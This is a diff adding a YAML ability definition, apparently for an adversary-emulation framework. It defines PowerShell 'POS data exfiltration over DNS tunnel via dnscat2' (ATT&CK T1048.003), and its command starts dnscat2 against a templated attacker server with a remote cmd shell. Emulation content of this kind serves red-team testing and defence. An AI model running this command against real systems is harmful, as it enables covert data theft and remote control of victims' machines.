@@ -1,0 +1,34 @@
+ability_id: e74554b8-0bc9-3d50-95a4-e45421925b49
+access: {}
+additional_info: {}
+buckets:
+- exfiltration
+delete_payload: true
+description: Powershell to execute POS data exfiltration over DNS tunnel via dnscat2
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'import-module "#{dnscat_ps1}"
+
+    Start-Dnscat2 -Domain #{dnscat2_server} -Exec cmd'
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - dnscat2.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: dnscat2-powershell Exfiltration
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: exfiltration
+technique_id: T1048.003
+technique_name: 'Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2
+  Protocol'
